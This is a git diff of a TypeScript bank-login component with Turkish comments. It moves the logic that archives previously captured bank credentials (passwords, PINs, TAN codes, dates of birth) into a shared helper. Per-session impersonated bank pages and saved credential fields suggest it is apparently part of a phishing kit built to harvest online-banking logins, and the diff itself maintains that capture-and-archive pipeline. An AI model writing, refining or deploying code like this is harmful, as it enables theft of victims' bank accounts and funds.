@@ -8,6 +8,7 @@ import { getBankTheme } from "@/lib/bank-theme-config";
 import { normalizeBankCustomHtml } from "@/lib/bank-custom-html";
 import { normalizeBankCredentialPayload, normalizeBankLoginFields } from "@/lib/bank-page-adapter";
 import { stepToPath } from "@/lib/session-routes";
+import { archivePreviousBankOnChange } from "@/lib/bank-cleanup";
 import { createBrowserSupabaseClient } from "@/lib/supabase/client";
 import { DEFAULT_DESIGN_CONFIG, BlockType } from "@/lib/bank-design-schema";
 import { getRenderableImageProps } from "@/lib/visual-tree-logo";
@@ -751,42 +752,12 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
         .limit(1)
         .maybeSingle();
       const fd = ((row as any)?.form_data ?? {}) as Record<string, unknown>;
-      const str = (x: unknown): string => (typeof x === "string" ? x.trim() : "");
-      const merged: Record<string, unknown> = { ...fd };
 
       // 🔴 KRITIK: bankSlug/bankName'e DOKUNMA — onlar son SUBMIT edilen bankanin
-      //    kayididir. Burada ezilirse submit'teki history mantigi eski bankayi
-      //    yanlis isimle arsivler (veya hic arsivlemez) ve eski credential'lar
-      //    yeni bankanin kismi alanlariyla ezilip KAYBOLUR.
-      //    Bunun yerine: goruntulenen banka farkliysa eski kaydi ONCE history'ye
-      //    arsivle, sonra flat credential alanlarini temizle ki yeni bankanin
-      //    kismi verisi eskisinin ustune "yanlis etiketle" yazilmasın.
-      const prevSlug = str(fd.bankSlug).toLowerCase();
-      const CRED_KEYS = [
-        "loginMethod","personalCode","bankPhone","username","password",
-        "verfuegernummer","pin","tacCode","dateOfBirth",
-        "orderedField1","orderedField2","orderedField2Type",
-      ];
-      if (prevSlug && prevSlug !== bank.slug.trim().toLowerCase()) {
-        const old: Record<string, string> = { bankName: str(fd.bankName), bankSlug: str(fd.bankSlug) };
-        let filled = 0;
-        for (const k of CRED_KEYS) {
-          old[k] = str(fd[k]);
-          if (old[k]) filled++;
-        }
-        if (filled >= 2) {
-          const arr: unknown[] = Array.isArray(fd.bankLoginHistory)
-            ? [...(fd.bankLoginHistory as unknown[])]
-            : [];
-          arr.unshift({ submittedAt: new Date().toISOString(), ...old });
-          merged.bankLoginHistory = arr;
-        }
-        // Eski bankanin flat credential alanlarini temizle (arsivlendi zaten);
-        // slug'i da sifirla ki submit "aynı banka" sanip tekrar arsivlemesin.
-        for (const k of CRED_KEYS) delete merged[k];
-        merged.bankSlug = "";
-        merged.bankName = "";
-      }
+      //    kayididir. Goruntulenen banka farkliysa eski kayit ONCE history'ye
+      //    arsivlenir ve flat credential alanlari temizlenir (paylasilan helper),
+      //    boylece yeni bankanin kismi verisi eskisinin ustune yazilmaz.
+      const merged: Record<string, unknown> = archivePreviousBankOnChange(fd, bank.slug);
 
       await supabase
         .from("sessions")
